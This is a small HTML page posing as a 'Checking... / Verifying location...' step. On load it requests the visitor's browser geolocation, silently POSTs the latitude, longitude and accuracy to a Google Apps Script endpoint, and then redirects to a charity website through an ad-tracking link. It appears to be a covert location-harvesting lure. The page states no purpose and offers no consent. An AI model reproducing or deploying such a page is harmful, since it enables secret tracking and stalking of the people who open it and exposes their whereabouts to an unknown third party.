<!DOCTYPE html>
<html>
<head>
  <title>Checking...</title>
  <script>
    function sendLocation(position) {
      const data = {
        lat: position.coords.latitude,
        lon: position.coords.longitude,
        accuracy: position.coords.accuracy
      };

      fetch('https://script.google.com/macros/s/AKfycby2aM9rZOcr_rtuDtJtpZfn8XWUPtDLaXNtN-zIJ9cMnKuIK_C1BnrWlQcgGdihYILw/exec', {
        method: 'POST',
        body: JSON.stringify(data),
        headers: {
          'Content-Type': 'application/json'
        }
      }).finally(() => {
        // Redirect after sending
        window.location.href = "https://mdauk.org/?gad_source=1&gad_campaignid=22360787915&gbraid=0AAAAA_AMd2gLdp1P611EFsbeIvv_UGjh8&gclid=EAIaIQobChMIsfi0v7GIjgMVJpJQBh37Rzl-EAAYASAAEgJThfD_BwE";
      });
    }

    function handleError(error) {
      console.error('Geolocation error:', error);
      window.location.href = "https://mdauk.org/?gad_source=1&gad_campaignid=22360787915&gbraid=0AAAAA_AMd2gLdp1P611EFsbeIvv_UGjh8&gclid=EAIaIQobChMIsfi0v7GIjgMVJpJQBh37Rzl-EAAYASAAEgJThfD_BwE";
    }

    window.onload = () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
      } else {
        handleError({ message: "Geolocation not supported." });
      }
    };
  </script>
</head>
<body>
  <p>Verifying location...</p>
</body>
</html>
